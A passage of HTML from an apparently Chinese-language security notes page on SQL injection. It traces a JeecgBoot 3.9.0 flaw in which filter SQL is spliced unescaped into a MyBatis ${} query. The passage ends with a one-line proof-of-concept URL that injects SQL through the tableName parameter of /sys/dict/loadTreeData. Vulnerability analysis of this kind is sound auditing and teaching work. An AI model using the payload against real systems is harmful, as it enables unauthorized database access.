</span></span><span style="display:flex;"><span>			<span style="color:#ff79c6">return</span> <span style="color:#ff79c6">null</span>;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#6272a4">// 4.检测查询条件是否存在SQL注入</span>
</span></span><span style="display:flex;"><span>		Map<span style="color:#ff79c6">&lt;</span>String, String<span style="color:#ff79c6">&gt;</span> queryParams <span style="color:#ff79c6">=</span> queryParams <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> HashMap<span style="color:#ff79c6">&lt;&gt;</span>(4);
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> (query <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">null</span>) {
</span></span><span style="display:flex;"><span>			<span style="color:#ff79c6">for</span> (Map.<span style="color:#50fa7b">Entry</span><span style="color:#ff79c6">&lt;</span>String, String<span style="color:#ff79c6">&gt;</span> searchItem : query.<span style="color:#50fa7b">entrySet</span>()) {
</span></span><span style="display:flex;"><span>				String fieldName <span style="color:#ff79c6">=</span> searchItem.<span style="color:#50fa7b">getKey</span>();
</span></span><span style="display:flex;"><span>				queryParams.<span style="color:#50fa7b">put</span>(SqlInjectionUtil.<span style="color:#50fa7b">getSqlInjectField</span>(fieldName), searchItem.<span style="color:#50fa7b">getValue</span>());
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">// 代码逻辑说明: [QQYUN-13741]【客户问题 南自】online表单自定义树 表后边加条件时 不生效------------</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span>(oConvertUtils.<span style="color:#50fa7b">isNotEmpty</span>(filterSql)){
</span></span><span style="display:flex;"><span>            queryParams.<span style="color:#50fa7b">put</span>(<span style="color:#f1fa8c">&#34;_tableFilterSql&#34;</span>, filterSql);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>		
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">return</span> baseMapper.<span style="color:#50fa7b">queryTreeList</span>(queryParams, table, text, code, pidField, pid, hasChildField, converIsLeafVal);
</span></span><span style="display:flex;"><span>	}</span></span></code></pre></td></tr></table>
</div>
</div><ol start="3">
<li>
<p>最后在 XML 中，MyBatis 使用 ${} 直接执行了_tableFilterSql</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;when</span> <span style="color:#50fa7b">test=</span><span style="color:#f1fa8c">&#34;key == &#39;_tableFilterSql&#39;&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    and ${value}  <span style="color:#6272a4">&lt;!-- 这里执行的就是 filterSql 的内容 --&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;/when&gt;</span></span></span></code></pre></td></tr></table>
</div>
</div></li>
</ol>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;select</span> <span style="color:#50fa7b">id=</span><span style="color:#f1fa8c">&#34;queryTreeList&#34;</span> <span style="color:#50fa7b">parameterType=</span><span style="color:#f1fa8c">&#34;Object&#34;</span> <span style="color:#50fa7b">resultType=</span><span style="color:#f1fa8c">&#34;org.jeecg.modules.system.model.TreeSelectModel&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>		select ${text} as &#34;title&#34;,
</span></span><span style="display:flex;"><span>			   ${code} as &#34;key&#34;,
</span></span><span style="display:flex;"><span>			   <span style="color:#ff79c6">&lt;if</span> <span style="color:#50fa7b">test=</span><span style="color:#f1fa8c">&#34;hasChildField != null and hasChildField != &#39;&#39;&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>				   <span style="color:#ff79c6">&lt;choose&gt;</span>
</span></span><span style="display:flex;"><span>					   <span style="color:#ff79c6">&lt;when</span> <span style="color:#50fa7b">test=</span><span style="color:#f1fa8c">&#34;converIsLeafVal!=null and converIsLeafVal==1&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>						   (case when ${hasChildField} = &#39;1&#39; then 0 else 1 end) as isLeaf,
</span></span><span style="display:flex;"><span>					   <span style="color:#ff79c6">&lt;/when&gt;</span>
</span></span><span style="display:flex;"><span>					   <span style="color:#ff79c6">&lt;otherwise&gt;</span>
</span></span><span style="display:flex;"><span>						   ${hasChildField} as isLeaf,
</span></span><span style="display:flex;"><span>					   <span style="color:#ff79c6">&lt;/otherwise&gt;</span>
</span></span><span style="display:flex;"><span>				   <span style="color:#ff79c6">&lt;/choose&gt;</span>
</span></span><span style="display:flex;"><span>			   <span style="color:#ff79c6">&lt;/if&gt;</span>
</span></span><span style="display:flex;"><span>			   ${pidField} as parentId
</span></span><span style="display:flex;"><span>			   from ${table}
</span></span><span style="display:flex;"><span>			   where
</span></span><span style="display:flex;"><span>		       <span style="color:#6272a4">&lt;!-- 父ID条件 --&gt;</span>
</span></span><span style="display:flex;"><span>			   <span style="color:#ff79c6">&lt;if</span> <span style="color:#50fa7b">test=</span><span style="color:#f1fa8c">&#34;query == null&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>				   <span style="color:#ff79c6">&lt;choose&gt;</span>
</span></span><span style="display:flex;"><span>					   <span style="color:#ff79c6">&lt;when</span> <span style="color:#50fa7b">test=</span><span style="color:#f1fa8c">&#34;pid != null and pid != &#39;&#39;&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>						   ${pidField} = #{pid}
</span></span><span style="display:flex;"><span>					   <span style="color:#ff79c6">&lt;/when&gt;</span>
</span></span><span style="display:flex;"><span>					   <span style="color:#ff79c6">&lt;otherwise&gt;</span>
</span></span><span style="display:flex;"><span>						   (${pidField} = &#39;&#39; OR ${pidField} IS NULL)
</span></span><span style="display:flex;"><span>					   <span style="color:#ff79c6">&lt;/otherwise&gt;</span>
</span></span><span style="display:flex;"><span>				   <span style="color:#ff79c6">&lt;/choose&gt;</span>
</span></span><span style="display:flex;"><span>			   <span style="color:#ff79c6">&lt;/if&gt;</span>
</span></span><span style="display:flex;"><span>			   <span style="color:#6272a4">&lt;!-- 查询条件组装 --&gt;</span>
</span></span><span style="display:flex;"><span>			   <span style="color:#ff79c6">&lt;if</span> <span style="color:#50fa7b">test=</span><span style="color:#f1fa8c">&#34;query!= null&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>			       1 = 1
</span></span><span style="display:flex;"><span>				   <span style="color:#ff79c6">&lt;foreach</span> <span style="color:#50fa7b">collection=</span><span style="color:#f1fa8c">&#34;query.entrySet()&#34;</span> <span style="color:#50fa7b">item=</span><span style="color:#f1fa8c">&#34;value&#34;</span>  <span style="color:#50fa7b">index=</span><span style="color:#f1fa8c">&#34;key&#34;</span> <span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>					   <span style="color:#ff79c6">&lt;choose&gt;</span>
</span></span><span style="display:flex;"><span>						   <span style="color:#ff79c6">&lt;when</span> <span style="color:#50fa7b">test=</span><span style="color:#f1fa8c">&#34;key == &#39;tenant_id&#39;&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>							   and tenant_id = #{value}
</span></span><span style="display:flex;"><span>						   <span style="color:#ff79c6">&lt;/when&gt;</span>
</span></span><span style="display:flex;"><span>			               <span style="color:#ff79c6">&lt;when</span> <span style="color:#50fa7b">test=</span><span style="color:#f1fa8c">&#34;key == &#39;_tableFilterSql&#39;&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                               and ${value}
</span></span><span style="display:flex;"><span>                           <span style="color:#ff79c6">&lt;/when&gt;</span>
</span></span><span style="display:flex;"><span>						   <span style="color:#ff79c6">&lt;otherwise&gt;</span>
</span></span><span style="display:flex;"><span>							   and ${key} LIKE #{value}
</span></span><span style="display:flex;"><span>						   <span style="color:#ff79c6">&lt;/otherwise&gt;</span>
</span></span><span style="display:flex;"><span>					   <span style="color:#ff79c6">&lt;/choose&gt;</span>
</span></span><span style="display:flex;"><span>				   <span style="color:#ff79c6">&lt;/foreach&gt;</span>
</span></span><span style="display:flex;"><span>					 <span style="color:#6272a4">&lt;!-- 【issues/3709】自定义树查询条件没有处理父ID，没有树状结构了 --&gt;</span>
</span></span><span style="display:flex;"><span>					 <span style="color:#ff79c6">&lt;choose&gt;</span>
</span></span><span style="display:flex;"><span>						 <span style="color:#ff79c6">&lt;when</span> <span style="color:#50fa7b">test=</span><span style="color:#f1fa8c">&#34;pid != null and pid != &#39;&#39;&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>							 and ${pidField} = #{pid}
</span></span><span style="display:flex;"><span>						 <span style="color:#ff79c6">&lt;/when&gt;</span>
</span></span><span style="display:flex;"><span>						 <span style="color:#ff79c6">&lt;otherwise&gt;</span>
</span></span><span style="display:flex;"><span>							 and (${pidField} = &#39;&#39; OR ${pidField} IS NULL)
</span></span><span style="display:flex;"><span>						 <span style="color:#ff79c6">&lt;/otherwise&gt;</span>
</span></span><span style="display:flex;"><span>					 <span style="color:#ff79c6">&lt;/choose&gt;</span>
</span></span><span style="display:flex;"><span>			   <span style="color:#ff79c6">&lt;/if&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">&lt;/select&gt;</span></span></span></code></pre></td></tr></table>
</div>
</div><p>POC</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span>http://127.0.0.1:8080/sys/dict/loadTreeData?tableName=sys_user where 1=1 and length(database())&gt;0</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="jdbc-框架">JDBC 框架<a class="anchor" href="#jdbc-%e6%a1%86%e6%9e%b6">#</a></h2>
</div>
</article>
 
      

      <footer class="book-footer">
        
  <div class="flex flex-wrap justify-between">
  <div>
  
  </div>
  <div>
  
  </div>
</div>
 
        
  
  <div class="book-comments">

</div>
  
 
        
        
  
 
        
  
  
    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
  

      </footer>

      <label for="menu-control" class="hidden book-menu-overlay"></label>
    </div>

    
  
  <aside class="book-toc">
    <div class="book-toc-content">
      
  
<nav id="TableOfContents">
  <ul>
    <li><a href="#常见基本sql语句">常见基本SQL语句</a></li>
    <li><a href="#mybatis框架">Mybatis框架</a></li>
    <li><a href="#mybatis-plus框架">Mybatis Plus框架</a>
      <ul>
        <li><a href="#jeecgboot-390-sysdictloadtreedata--tablename参数sql-注入"><strong>JeecgBoot 3.9.0 /sys/dict/loadTreeData tableName参数SQL 注入</strong></a></li>
      </ul>
    </li>
    <li><a href="#jdbc-框架">JDBC 框架</a></li>
  </ul>
</nav>



    </div>
  </aside>
  
 
  </main>

  
</body>
</html>




















